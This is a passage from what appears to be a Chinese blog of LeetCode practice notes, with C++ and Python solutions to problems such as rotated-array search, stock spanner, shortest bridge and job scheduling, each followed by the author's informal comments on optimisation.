假设$ n = 110011001b $ ，则$ x^n = x + x^8 + x^{16} + x^{128} + x^{256} $ 等价于$$ \\sum_0^n n_i \\times x^{2^i} (i从右到左为0,1,2…) $$ 817. 链表组件1234567891011121314151617181920212223class Solution {public: int numComponents(ListNode* head, vector&lt;int&gt;&amp; nums) { bool m[10005] = {false}; for(int num : nums) { m[num] = true; } int component_count = 0; while(head != nullptr &amp;&amp; !m[head-&gt;val]) { head = head-&gt;next; } while(head) { while(head != nullptr &amp;&amp; m[head-&gt;val]) { head = head-&gt;next; } while(head != nullptr &amp;&amp; !m[head-&gt;val]) { head = head-&gt;next; } component_count++; } return component_count; }}; 适当展开循环，可以减少不必要的判断 1790. 仅执行一次字符串交换能否使两个字符串相等12345678910111213141516171819202122class Solution {public: bool areAlmostEqual(string s1, string s2) { int len = s1.size(); if(s2.size() != len) return false; if(s1 == s2) return true; int diff1 = -1; for(int i = 0; i &lt; len; i++) { if(s1[i] != s2[i]) { if(diff1 == -1) { diff1 = i; } else { char a = s2[diff1]; s2[diff1] = s2[i]; s2[i] = a; return s1 == s2; } } } return false; }}; 可以轻易地用脚趾头想到，两个字符串只能有两处不同，长度相同 当找到第二个字符串后进行交换，如果交换后和s1相等，则ok，否则不ok 优化 防止重复比较diff1 与 diff2之间的字符123456789101112131415161718192021222324class Solution {public: bool areAlmostEqual(string s1, string s2) { int len = s1.size(); if(s2.size() != len) return false; if(s1 == s2) return true; int diff1 = -1; for(int i = 0; i &lt; len; i++) { if(s1[i] != s2[i]) { if(diff1 == -1) { diff1 = i; } else { for(int j = i+1; j &lt; len; j++) { if(s1[j] != s2[j]) { return false; } } return s2[diff1] == s1[i] &amp;&amp; s2[i] == s1[diff1]; } } } return false; }}; 856. 括号的分数12345678910111213141516171819202122232425class Solution {public: int scoreOfParentheses(string s) { stack&lt;int&gt; score; int len = s.size(); score.push(0); for(int i = 0; i &lt; len; i++) { if(s[i] == '(') { score.push(0); } else { int sc1 = score.top(); score.pop(); int sc2 = score.top(); score.pop(); if(sc1 == 0) { sc1+=1; } else { sc1*=2; } score.push(sc1+sc2); } } return score.top(); }}; 进行栈的模拟，遇到左括号push一个0，表示该左括号内部的平衡括号分数总和当遇到一个右括号，pop一个score，如果是0，说明是()，则对该score+1，如果不是0，则该score乘以2从栈中再pop一个score记为score2，score2与score相加后入栈为了防止最外端的括号无法取出两个score，在遍历s前先push一个0最终栈顶元素就是最后结果 1700. 无法吃午餐的学生数量12345678910111213141516171819202122class Solution {public: int countStudents(vector&lt;int&gt;&amp; students, vector&lt;int&gt;&amp; sandwiches) { queue&lt;int&gt; stuqueue; int len = students.size(); for(int i = 0; i &lt; len; i++) { stuqueue.push(students[i]); } for(int i = 0; i &lt; len; i++) { int count = 0; while(count &lt; len &amp;&amp; stuqueue.front() != sandwiches[i]) { int front = stuqueue.front(); stuqueue.pop(); stuqueue.push(front); count++; } if(count == len) return stuqueue.size(); stuqueue.pop(); } return stuqueue.size(); }}; 优化，直接模拟效率太低了123456789101112131415161718class Solution {public: int countStudents(vector&lt;int&gt;&amp; students, vector&lt;int&gt;&amp; sandwiches) { int len = students.size(); int s1 = accumulate(students.begin(), students.end(), 0); int s0 = len - s1; for(int i = 0; i &lt; len; i++) { if(sandwiches[i] == 0 &amp;&amp; s0 != 0) { s0--; } else if(sandwiches[i] == 1 &amp;&amp; s1 != 0) { s1--; } else { return s0+s1; } } return s0+s1; }}; 当学生无法拿栈顶的东西时，一定是因为剩下的所有人都不吃当前栈顶元素。 与队列的先后顺序无关 从栈顶到栈底，遇到某个食物只要在队列里随便找一个学生就好了。如果恰好能吃完，则返回0，如果遇到某个食物没人吃了，就返回剩下的人数。 根据题意，我们可以知道栈顶的三明治能否被拿走取决于队列剩余的学生中是否有喜欢它的. 只要当前栈顶的东西学生不喜欢，就会一直向后排队，直到出现喜欢的东西为止，所以可以不考虑当前队列的顺序。 779. 第K个语法符号123456789101112131415161718192021222324class Solution {public: int kthGrammar(int n, int k) { stack&lt;int&gt; route; while(k&gt;1) { route.push(k%2); k = k%2 + k/2; } //route.push(1); string a = &quot;01&quot;,b = &quot;10&quot;; string cur = a; int next = 0; while(!route.empty()) { if(cur[next] == '0') { cur = a; } else { cur = b; } next=1-route.top(); route.pop(); } return cur[next]-'0'; }}; 类似完全二叉树的思想，10的父节点是1，01的父节点是0比如需要第n行的第k个，那么其父节点是第n-1行第$ \\lceil n/2 \\rceil = n/2 + n%2 $个数由于只有0和1两种情况，对于k，如果k%2 == 1,则是其父节点的左子节点，否则是右子节点故可以计算 $ (\\lceil n/2 \\rceil)%2 $，依次找到根节点，根节点一定是0，stack中最后一个数一定是1则从0生成01，再根据stack中剩下的数，如果是1，则是01的左节点0，又生成01；如果是0，则是01的右节点1，生成10，用这种方法逐渐生成到叶节点以k=14为例，祖先依次是7，4，2，1，stack中依次是，1，0，0，1，0则 0 -&gt; 01 -&gt; 10 -&gt; 01 -&gt; 01 -&gt; 1 0010110011010010110100110010110 这个算法甚至不需要用n这个参数 优化-使用位运算1234567891011121314151617181920212223class Solution {public: int kthGrammar(int n, int k) { stack&lt;int&gt; route; while(k&gt;1) { route.push(k%2); k = k%2 + k/2; } int cur = 0x01; int next = 1; while(!route.empty()) { cur = (cur &gt;&gt; next)&amp;0x01; if(cur == 0) { cur = 0x01; } else { cur = 0x02; } next=route.top(); route.pop(); } return (cur&gt;&gt;next)&amp;0x01; }}; 524. 通过删除字母匹配到字典里最长单词1234567891011121314151617181920212223242526class Solution {public: string findLongestWord(string s, vector&lt;string&gt;&amp; dictionary) { // sort(dictionary.begin(), dictionary.end()); int lend = dictionary.size(); int lens = s.size(); int maxlen = 0; string maxstr = &quot;&quot;; for(int i = 0; i &lt; lend; i++) { int j = 0, k = 0; int leni = dictionary[i].size(); for(; k &lt; leni &amp;&amp; j &lt; lens; j++) { if(s[j] == dictionary[i][k]) k++; } if(leni &gt;= maxlen &amp;&amp; k &gt;= leni) { if(maxlen == leni) { maxstr = dictionary[i] &gt; maxstr ? maxstr : dictionary[i]; } else { maxstr = dictionary[i]; } maxlen = leni; } } return maxstr; }}; 暴力，干就完了 优化(抄答案就完事)1234567891011121314151617181920212223242526class Solution: def findLongestWord(self, s: str, dictionary: List[str]) -&gt; str: m = len(s) f = [[0] * 26 for _ in range(m)] f.append([m] * 26) for i in range(m - 1, -1, -1): for j in range(26): if ord(s[i]) == j + 97: f[i][j] = i else: f[i][j] = f[i + 1][j] print(f) res = &quot;&quot; for t in dictionary: match = True j = 0 for i in range(len(t)): if f[j][ord(t[i]) - 97] == m: match = False break j = f[j][ord(t[i]) - 97] + 1 if match: if len(t) &gt; len(res) or (len(t) == len(res) and t &lt; res): res = t return res 大概就是生成一个表，如果f[i][j]不是m，就表示第i位或第i位之后可以取到这个字符为了保证按照顺序使用字母表s中的字符，j=f[i][j]，表示下一次要从这个位置开始取字符 81. 搜索旋转排序数组 II12345678910111213141516171819202122232425262728class Solution {public: bool search(vector&lt;int&gt;&amp; nums, int target) { int len = nums.size(); int k = 1; for(int i = 1; i &lt; len; i++, k++) { if(nums[i] &lt; nums[i-1]) { break; } } k = len - k; // cout &lt;&lt; k &lt;&lt; endl; int l = 0, r = len; while(l &lt;= r) { int mid = (r - l)/2 + l; // cout &lt;&lt; nums[(mid - k + len)%len] &lt;&lt; endl; if(target == nums[(mid - k + len)%len]) { return true; } else if(target &lt; nums[(mid - k + len)%len]) { r = mid-1; } else { l = mid+1; } } // cout &lt;&lt; l &lt;&lt; r &lt;&lt; endl; return target == nums[(r - k + len)%len] || target == nums[(l - k + len)%len]; }}; O(n)的算法不太好 优化123456789101112131415161718192021222324252627282930313233343536class Solution {public: bool search(vector&lt;int&gt; &amp;nums, int target) { int n = nums.size(); if (n == 0) { return false; } if (n == 1) { return nums[0] == target; } int l = 0, r = n - 1; while (l &lt;= r) { int mid = (l + r) / 2; if (nums[mid] == target) { return true; } if (nums[l] == nums[mid] &amp;&amp; nums[mid] == nums[r]) { ++l; --r; } else if (nums[l] &lt;= nums[mid]) { if (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) { r = mid - 1; } else { l = mid + 1; } } else { if (nums[mid] &lt; target &amp;&amp; target &lt;= nums[n - 1]) { l = mid + 1; } else { r = mid - 1; } } } return false; }}; 分成了两个递增区间，左边较大的和右边较小的如果mid落在左边区间，如果mid大于target 且 target也落在较大的区间，向左移动，否则向右移动如果mid落在右边区间，如果mid小于target 且 target也落在较大的区间，向右移动，否则向左移动如果特殊情况[1,1,0,1,1,1]，则直接缩小区间大小，逐渐逼近 540. 有序数组中的单一元素1234567891011121314151617181920212223242526272829303132class Solution {public: int singleNonDuplicate(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int l = 0, r = len; while(l &lt;= r) { int mid = (r - l)/2 + l; if(mid%2 == 0) { if(mid &gt; 0 &amp;&amp; nums[mid-1] == nums[mid]) { r = mid-1; continue; } if (mid &lt; len-1 &amp;&amp; nums[mid+1] == nums[mid]) { l = mid+1; continue; } return nums[mid]; } else { if(mid &gt; 0 &amp;&amp; nums[mid-1] == nums[mid]) { l = mid+1; continue; } if (mid &lt; len-1 &amp;&amp; nums[mid+1] == nums[mid]) { r = mid-1; continue; } return nums[mid]; } } return nums[l]; }}; 如果下标是偶数，如果左边没有单个数字，那么我右边应该和我一样，那么单个数字就在我右边，否则就在我左边如果下标是奇数，如果左边没有单个数字，那么我左边应该和我一样，那么单个数字就在我右边，否则就在我左边 优化如果mid是奇数，处理成偶数 1234567891011121314151617class Solution {public: int singleNonDuplicate(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int l = 0, r = len-1; while(l &lt; r) { int mid = (r - l)/2 + l; mid -= mid &amp; 1; if (nums[mid+1] == nums[mid]) { l = mid+2; } else { r = mid; } } return nums[l]; }}; 154. 寻找旋转排序数组中的最小值 II12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution {public: int findMin(vector&lt;int&gt;&amp; nums) { int len = nums.size(); if (len == 1) { return nums[0]; } if (len == 2) { return min(nums[0], nums[1]); } int l = 0, r = len-1; while (l &lt;= r) { int mid = (l + r) / 2; if (nums[l] == nums[mid] &amp;&amp; nums[mid] == nums[r]) { ++l; --r; } else if (nums[l] &lt;= nums[mid]) { if(nums[mid] &lt;= nums[r]) return nums[l]; if(mid &lt; len-1) { if (nums[mid] &lt;= nums[mid+1]) { l = mid + 1; } else { return nums[mid+1]; } } else { return nums[mid]; } } else { if(mid &gt; 0) { if (nums[mid] &lt; nums[mid-1]) { return nums[mid]; } else { r = mid -1; } } else { return nums[mid]; } } } return nums[r]; }}; 优化，去掉不必要的判断1234567891011121314151617181920212223242526272829class Solution {public: int findMin(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int l = 0, r = len-1; while (l &lt; r) { int mid = (l + r) / 2; if (nums[l] == nums[mid] &amp;&amp; nums[mid] == nums[r]) { ++l; --r; } else if (nums[l] &lt;= nums[mid]) { if(nums[mid] &lt;= nums[r]) return nums[l]; if (nums[mid] &lt;= nums[mid+1]) { l = mid + 1; } else { return nums[mid+1]; } } else { if (nums[mid] &lt; nums[mid-1]) { return nums[mid]; } else { r = mid -1; } } } return nums[r]; }}; 题解思路123456789101112131415161718class Solution {public: int findMin(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int l = 0, r = len-1; while (l &lt; r) { int mid = (l + r) / 2; if (nums[mid] == nums[r]) { --r; } else if (nums[r] &lt;= nums[mid]) { l = mid + 1; } else { r = mid; } } return nums[r]; }}; 不需要关注左边的情况，之前的代码比较对称，可以看出可以简化mid比r大，说明落在了左侧较大的区间，右移如果mid比r小，说明落在了右侧的较小区间，左移，但不确定我是不是最小值，故r=mid不减1 901. 股票价格跨度12345678910111213141516171819202122class StockSpanner {public: vector&lt;int&gt; stocks; int len; StockSpanner() { len = 0; } int next(int price) { stocks.push_back(price); len++; int m = 0; for(int i = len-1; i &gt;= 0; i--) { if(stocks[i] &lt;= price) { m++; } else { break; } } return m; }}; 显然太慢了 优化1234567891011121314151617181920212223242526272829303132333435363738394041424344class StockSpanner {public: vector&lt;int&gt; peak; vector&lt;int&gt; stocks; int len; int peaklen; int l1, l2; StockSpanner() { len = 0; peaklen = 0; } int next(int price) { len++; stocks.push_back(price); if(len == 1) { return 1; } if(len == 2) { if(stocks[len-2] &gt; price) { peaklen++; peak.push_back(len-2); } return 1 + (stocks[len-2] &lt;= price); } int a = stocks[len-1], b = stocks[len-2], c = stocks[len-3]; if(b &gt;= a &amp;&amp; b &gt; c) { peaklen++; peak.push_back(len-2); } int pk = peaklen-1; while(pk &gt;= 0 &amp;&amp; stocks[peak[pk]] &lt;= price) { pk--; } if(pk &lt; 0) { return len; } int i; for(i = peak[pk]; i &lt; len &amp;&amp; stocks[i] &gt; price; i++) { } if(i == len-1) return 1; return len - i; }}; 股价的变化是波动的，会出现波峰和波谷，找到前一个比我大的波峰，向后查找，就可以找到对应的位置 再优化找到波峰，还可以记录波谷，这样波峰波谷之间可以二分查找 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class StockSpanner {public: vector&lt;pair&lt;int, int&gt;&gt; peak; vector&lt;int&gt; stocks; int len; int peaklen; int valleylen; int l1, l2; StockSpanner() { len = 0; peaklen = 0; valleylen = 0; } int next(int price) { len++; stocks.push_back(price); if(len == 1) { return 1; } if(len == 2) { if(stocks[len-2] &gt; price) { peaklen++; peak.push_back(pair&lt;int,int&gt;(len-2, INT_MAX)); } return 1 + (stocks[len-2] &lt;= price); } int a = stocks[len-1], b = stocks[len-2], c = stocks[len-3]; if(b &gt;= a &amp;&amp; b &gt; c) { peaklen++; peak.push_back(pair&lt;int, int&gt;(len-2, INT_MAX)); } else if(b &lt;= a &amp;&amp; b &lt; c) { peak[peaklen-1].second = len-2; } int pk = peaklen-1; while(pk &gt;= 0 &amp;&amp; stocks[peak[pk].first] &lt;= price) { pk--; } if(pk &lt; 0) { return len; } if(peak[pk].second == INT_MAX) return 1; auto ite = lower_bound(stocks.begin()+peak[pk].first,stocks.begin()+peak[pk].second+1,price, greater&lt;int&gt;()); if(ite == stocks.end()) return 1; return stocks.end() - ite; }}; debug没de出来 看答案123456789101112131415161718192021class StockSpanner {public: StockSpanner() { this-&gt;stk.emplace(-1, INT_MAX); this-&gt;idx = -1; } int next(int price) { idx++; while (price &gt;= stk.top().second) { stk.pop(); } int ret = idx - stk.top().first; stk.emplace(idx, price); return ret; }private: stack&lt;pair&lt;int, int&gt;&gt; stk; int idx;}; 好像是一样的思路，但是我像个傻子 347. 前 K 个高频元素1234567891011121314151617181920212223242526class Solution {public: vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) { unordered_map&lt;int, int&gt; frequent; int len = nums.size(); for(int i = 0; i &lt; len; i++) { frequent[nums[i]]++; } sort(nums.begin(), nums.end(), [&amp;](int a, int b) -&gt; bool { if(frequent[a] != frequent[b]) { return frequent[a] &gt; frequent[b]; } return a &lt; b; }); vector&lt;int&gt; res; res.push_back(nums[0]); int count = 1; for(int i = 1; count &lt; k; i++) { if(nums[i] != nums[i-1]) { res.push_back(nums[i]); count++; } } return res; }}; 优化三次遍历 1234567891011121314151617181920212223class Solution {public: vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) { unordered_map&lt;int, int&gt; frequent; map&lt;int, set&lt;int&gt;&gt; inv; int len = nums.size(); for(int i = 0; i &lt; len; i++) { frequent[nums[i]]++; } for(int i = 0; i &lt; len; i++) { inv[frequent[nums[i]]].insert(nums[i]); } vector&lt;int&gt; res; int count = 0; for(auto ite = inv.rbegin(); ite != inv.rend() &amp;&amp; count &lt; k; ite++) { for(auto jte = ite-&gt;second.begin(); jte != ite-&gt;second.end(); jte++) { res.push_back(*jte); count++; } } return res; }};","link":"/home/2022/10/22/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9315/"},{"title":"LeetCode-16","text":"934. 最短的桥1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class Solution {public: int indexMap[105][105] = {0}; //岛屿点，对应一个岛 int n; int edgex[105*105] = {0}; int edgey[105*105] = {0}; int edgei[105*105] = {0}; int edgej[105*105] = {0}; int edgecount = 0; int edgeicount = 0; int shortestBridge(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { n = grid.size(); int islandCount = 0; int p1x,p1y; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { if(grid[i][j] == 1 &amp;&amp; indexMap[i][j] == 0) { ++islandCount; dfs(grid, i, j, islandCount); } } } int min=INT_MAX; for(int i = 0; i &lt; edgecount; i++) { for(int j = 0; j &lt; edgeicount; j++) { int path = abs(edgex[i]-edgei[j]) + abs(edgey[i] - edgej[j]) - 1; if(min &gt;= path) { min = path; } } } return min; } void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int x, int y, int index) { if(x &lt; 0 || y &lt; 0 || x &gt;= n || y &gt;= n) return; if(indexMap[x][y] != 0 || grid[x][y] != 1) return; indexMap[x][y] = index; bool flag = (y-1 &gt;= 0 &amp;&amp; grid[x][y-1] == 0) || (y+1 &lt; n &amp;&amp; grid[x][y+1] == 0) || (x+1 &lt; n &amp;&amp; grid[x+1][y] == 0) || (x-1 &gt;= 0 &amp;&amp; grid[x-1][y] == 0); dfs(grid, x, y-1, index); dfs(grid, x, y+1, index); dfs(grid, x+1, y, index); dfs(grid, x-1, y, index); if(flag) { if(indexMap[x][y]==1) { edgex[edgecount]=x; edgey[edgecount]=y; edgecount++; } else if(indexMap[x][y]==2) { edgei[edgeicount]=x; edgej[edgeicount]=y; edgeicount++; } } }}; 和之前写的一道题有点像，827. 最大人工岛827. 最大人工岛我先dfs找到所有连通子图和包围岛的0点，然后找这些点中有无同时包围多个岛的，把他们的面积加起来取最大值 这道题也可以使用相同的方法，找到每个岛屿的边界点，然后计算边界点的距离(只有两个岛，两个岛之间肯定是可以连通的，且不管使用那条途径，最短距离一定是 $ abs(x_1 - x_2) + abs(y_1-y_2)-1 $) 看答案1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution {public: void dfs(int x, int y, vector&lt;vector&lt;int&gt;&gt;&amp; grid, queue&lt;pair&lt;int, int&gt;&gt; &amp;qu) { if (x &lt; 0 || y &lt; 0 || x &gt;= grid.size() || y &gt;= grid[0].size() || grid[x][y] != 1) { return; } qu.emplace(x, y); grid[x][y] = -1; dfs(x - 1, y, grid, qu); dfs(x + 1, y, grid, qu); dfs(x, y - 1, grid, qu); dfs(x, y + 1, grid, qu); } int shortestBridge(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int n = grid.size(); vector&lt;vector&lt;int&gt;&gt; dirs = {{-1, 0}, {1, 0}, {0, 1}, {0, -1}}; for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; n; j++) { if (grid[i][j] == 1) { queue&lt;pair&lt;int, int&gt;&gt; qu; dfs(i, j, grid, qu); int step = 0; while (!qu.empty()) { int sz = qu.size(); for (int i = 0; i &lt; sz; i++) { auto [x, y] = qu.front(); qu.pop(); for (int k = 0; k &lt; 4; k++) { int nx = x + dirs[k][0]; int ny = y + dirs[k][1]; if (nx &gt;= 0 &amp;&amp; ny &gt;= 0 &amp;&amp; nx &lt; n &amp;&amp; ny &lt; n) { if (grid[nx][ny] == 0) { qu.emplace(nx, ny); grid[nx][ny] = -1; } else if (grid[nx][ny] == 1) { return step; } } } } step++; } } } } return 0; }}; 对于一个为1的点，先dfs吧所有在同一个岛屿内的1放入队列q中对于队列中的每个节点，把包围他们的0入队，反复操作，直到遇到1也就是在岛屿附近画圈，遇到1对应的圈数就是结果。 915. 分割数组123456789101112131415161718192021222324252627282930class Solution {public: int partitionDisjoint(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; max(n+1); max[0] = INT_MIN; vector&lt;int&gt; min(n); min[n-1] = nums[n-1]; for(int i = 0; i &lt; n; i++) { if(nums[i] &gt; max[i]) { max[i+1] = nums[i]; } else { max[i+1] = max[i]; } } for(int i = n-2; i &gt;= 0; i--) { if(nums[i] &lt; min[i+1]) { min[i] = nums[i]; } else { min[i] = min[i+1]; } } for(int i = 1; i &lt; n; i++) { if(max[i] &lt;= min[i]) { return i; } } return -1; }}; 没想到会这么慢 优化1 max数组没必要 不用vector 12345678910111213141516171819202122232425class Solution {public: int partitionDisjoint(vector&lt;int&gt;&amp; nums) { int n = nums.size(); int min[100005] = {0}; min[n-1] = nums[n-1]; for(int i = n-2; i &gt;= 0; i--) { if(nums[i] &lt; min[i+1]) { min[i] = nums[i]; } else { min[i] = min[i+1]; } } int max = nums[0]; for(int i = 1; i &lt; n; i++) { if(max &lt;= min[i]) { return i; } if(max &lt; nums[i]) { max = nums[i]; } } return -1; }}; 1768. 交替合并字符串12345678910111213141516171819202122class Solution {public: string mergeAlternately(string word1, string word2) { string ret; int len1 = word1.size(), len2 = word2.size(); int i = 0; for(; i &lt; len1 &amp;&amp; i &lt; len2; i++) { ret.push_back(word1[i]); ret.push_back(word2[i]); } if(len1 &lt; len2) { for(; i &lt; len2; i++) { ret.push_back(word2[i]); } } else { for(; i &lt; len1; i++) { ret.push_back(word1[i]); } } return ret; }}; 1235. 规划兼职工作123456789101112131415161718192021class Solution {public: int jobScheduling(vector&lt;int&gt;&amp; startTime, vector&lt;int&gt;&amp; endTime, vector&lt;int&gt;&amp; profit) { int n = startTime.size(); vector&lt;int&gt; index(n); for(int i = 0; i &lt; n; i++) { index[i] = i; } sort(index.begin(), index.end(), [&amp;](int a, int b)-&gt;bool {return endTime[a] &lt; endTime[b];}); vector&lt;int&gt; dp(n+1); for(int i = 1; i &lt;= n; i++) { int j = index[i-1]; int k = i-2; for(; k &gt;= 0; k--) { if(endTime[index[k]] &lt;= startTime[j]) break; } dp[i] = max(dp[i-1], dp[k+1] + profit[j]); } return dp[n]; }}; 开始想用贪心，给时薪排序，一次选择，但是发现这样得到的不是profit最大，而是工作时间更短的情况下的收益最大看了答案后自己写的，发现是一个非常典型的dp问题 官方题解123456789101112131415161718192021class Solution {public: int jobScheduling(vector&lt;int&gt; &amp;startTime, vector&lt;int&gt; &amp;endTime, vector&lt;int&gt; &amp;profit) { int n = startTime.size(); vector&lt;vector&lt;int&gt;&gt; jobs(n); for (int i = 0; i &lt; n; i++) { jobs[i] = {startTime[i], endTime[i], profit[i]}; } sort(jobs.begin(), jobs.end(), [](const vector&lt;int&gt; &amp;job1, const vector&lt;int&gt; &amp;job2) -&gt; bool { return job1[1] &lt; job2[1]; }); vector&lt;int&gt; dp(n + 1); for (int i = 1; i &lt;= n; i++) { int k = upper_bound(jobs.begin(), jobs.begin() + i - 1, jobs[i - 1][0], [&amp;](int st, const vector&lt;int&gt; &amp;job) -&gt; bool { return st &lt; job[1]; }) - jobs.begin(); dp[i] = max(dp[i - 1], dp[k] + jobs[i - 1][2]); } return dp[n]; }}; 复习 769. 最多能完成排序的块这个题之前没有看太懂，现在再看一次 题解1123456789101112131415161718class Solution { public int maxChunksToSorted(int[] arr) { int n = arr.length, ans = 0; for (int i = 0, j = 0, min = n, max = -1; i &lt; n; i++) { min = Math.min(min, arr[i]); max = Math.max(max, arr[i]); if (j == min &amp;&amp; i == max) { ans++; j = i + 1; min = n; max = -1; } } return ans; }}作者：AC_OIer链接：https://leetcode.cn/problems/max-chunks-to-make-sorted/solution/by-ac_oier-4uny/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 这个题解比官方的好理解一点，j比i落后一点当i，j区间内拥有i，j两个数时，且i是最大值，j的最小值，这时对这个区间排序，可以让max = i到i的位置，min = j到j的位置也就是说i，j区间内所有数字都找到了自己的位置。这就找到了一个划分，重复这样做，就可以找到所有区间 题解2123456789101112131415161718192021222324class Solution {public: int maxChunksToSorted(vector&lt;int&gt;&amp; arr) { stack&lt;int&gt; stk; for (int v : arr) { if (stk.empty() || v &gt;= stk.top()) { stk.push(v); } else { int mx = stk.top(); stk.pop(); while (!stk.empty() &amp;&amp; stk.top() &gt; v) { stk.pop(); } stk.push(mx); } } return stk.size(); }};作者：lcbin链接：https://leetcode.cn/problems/max-chunks-to-make-sorted/solution/by-lcbin-jgrv/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 以数据 单调栈单调栈：分为单调递增和单调递减栈(栈内元素成递增或者递减性) 单调栈的作用 把序列中每个元素放到单调栈中进行维护就可以在 O(n) 的时间复杂度内求出区间每个元素为最大值/最小值时 单调栈的性质如下： 元素加入栈前会把栈顶破坏单调性的元素删除 一般使用单调栈的题目具有以下的两点 离自己最近（栈的后进先出的性质） 比自己大（小）、高(低) 板子： 12345678910111213stack&lt;int&gt; stk;for (遍历这个数组){ if (栈空 || 栈顶元素大于等于当前比较元素){ 入栈; } else{ while (栈不为空 &amp;&amp; 栈顶元素小于当前元素){ 栈顶元素出栈; 更新结果; } 当前数据入栈; }} 1822. 数组元素积的符号1234567891011121314class Solution {public: int arraySign(vector&lt;int&gt;&amp; nums) { bool ret = false; for(int n : nums) { if(n==0){ return 0; } else if (n&lt;0) { ret=!ret; } } return ret?-1:1; }}; 比较简单，就是数数的问题","link":"/home/2022/10/25/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9316/"},{"title":"LeetCode-17","text":"1662. 检查两个字符串数组是否相等12345678910111213141516class Solution {public: bool arrayStringsAreEqual(vector&lt;string&gt;&amp; word1, vector&lt;string&gt;&amp; word2) { return join(move(word1)) == join(move(word2)); } string join(vector&lt;string&gt;&amp;&amp; word) { string s; int len = word.size(); if(len &lt;= 0) return s; for(int i = 0; i &lt; len-1; i++) { s += word[i]; } s+=word[len-1]; return s; }}; 实现一个join函数就好了 481. 神奇字符串1234567891011121314151617181920212223class Solution {public: int magicalString(int n) { int bit = 3; int count = 1; bool q[100005] = {false}; int queue_front = 0; int queue_rear = 0; bool cur=1; bool gen=0; while(bit &lt; n) { bit += cur+1; q[queue_front++] = gen; if(cur) { q[queue_front++] = gen; } gen=1-gen; count+=gen?cur+gen:0; cur = q[queue_rear++]; } return count -(bit&gt;n &amp;&amp; gen); }}; 关键在于想清楚如何生成这个神奇字符串，题目中说，s的前几个字符是122111生成1,s=12生成22，因为前一个1生成了1，这个2不能也生成1,s=1222生成11，因为前一个2生成了2，这个2不能也生成2,s=122111生成2，前一个2生成了1，这个1就只能生成2了,s=1221121生成1,s=12211212生成22,s=122112122 只要有前三个字符122，即可生成全部字符 784. 字母大小写全排列123456789101112131415161718192021222324252627class Solution {public:vector&lt;string&gt; res;int len; vector&lt;string&gt; letterCasePermutation(string s) { len = s.size(); search(s, 0); return res; } void search(string s, int index) { if(index&gt;=len) { res.emplace_back(s); return; } if(isalpha(s[index])) { search(s,index+1); if(isupper(s[index])) { s[index] = s[index]-'A'+'a'; } else { s[index] = s[index]-'a'+'A'; } search(s, index+1); } else { search(s, index+1); } }}; 搜! 搜就完了 优化 可以搜索下一个alpha的位置，不必每个字符都递归，节省递归深度 12345678910111213141516171819202122232425262728class Solution {public:vector&lt;string&gt; res;int len; vector&lt;string&gt; letterCasePermutation(string s) { len = s.size(); search(s, nextAlpha(s, 0)); return res; } void search(string&amp; s, int index) { if(index&gt;=len) { res.emplace_back(s); return; } int next=nextAlpha(s, index+1); search(s,next); if(isupper(s[index])) { s[index] = s[index]-'A'+'a'; } else { s[index] = s[index]-'a'+'A'; } search(s, next); } int nextAlpha(string&amp; s, int index){ while(index&lt;len &amp;&amp; !isalpha(s[index])) index++; return index; }}; 1773. 统计匹配检索规则的物品数量123456789101112131415161718class Solution {public: int countMatches(vector&lt;vector&lt;string&gt;&gt;&amp; items, string ruleKey, string ruleValue) { int index=0; if(ruleKey[0]=='c') { index=1; } else if(ruleKey[0]=='n') { index=2; } int count = 0; for(auto &amp;&amp;item : items) { if(!item[index].compare(ruleValue)) { count++; } } return count; } }; 感觉直接比较第0个字符应该也很快吧？ 907. 子数组的最小值之和123456789101112131415161718192021222324252627282930313233class Solution {public: int sumSubarrayMins(vector&lt;int&gt;&amp; arr) { int n = arr.size(); vector&lt;int&gt; monoStack; vector&lt;int&gt; left(n), right(n); for (int i = 0; i &lt; n; i++) { while (!monoStack.empty() &amp;&amp; arr[i] &lt;= arr[monoStack.back()]) { monoStack.pop_back(); } // 小于栈内元素，则 left[i] = i - (monoStack.empty() ? -1 : monoStack.back()); // 若空，则放入下一个序号，否则是与前一个数的距离 monoStack.emplace_back(i); } // 得到一个单增的栈 //只需要找到每个元素 arr[i] 以该元素为最右且最小的子序列的数目 left[i]，以及以该元素为最左且最小的子序列的数目 right[i]，则以 arr[i] 为最小元素的子序列的数目合计为 left[i]×right[i] monoStack.clear(); for (int i = n - 1; i &gt;= 0; i--) { while (!monoStack.empty() &amp;&amp; arr[i] &lt; arr[monoStack.back()]) { monoStack.pop_back(); } right[i] = (monoStack.empty() ? n : monoStack.back()) - i; monoStack.emplace_back(i); } long long ans = 0; long long mod = 1e9 + 7; for (int i = 0; i &lt; n; i++) { ans = (ans + (long long)left[i] * right[i] * arr[i]) % mod; } return ans; }}; 看了答案才会，想到是用单调栈，但是没有思路$ left \\times right $ 的原因是，n个元素的连续子数组的个数为 $ n \\times (n-1) $ 1620. 网络信号最好的坐标123456789101112131415161718192021222324252627282930313233343536class Solution {public: int len; int Power(int x, int y, vector&lt;vector&lt;int&gt;&gt;&amp; towers, int radius) { int power = 0; for(int j = 0; j &lt; len; j++) { double d = sqrt((towers[j][0]-x)*(towers[j][0]-x) + (towers[j][1]-y)*(towers[j][1]-y)); if(d &lt;= radius) { power += towers[j][2]/(1+d); } } return power; } vector&lt;int&gt; bestCoordinate(vector&lt;vector&lt;int&gt;&gt;&amp; towers, 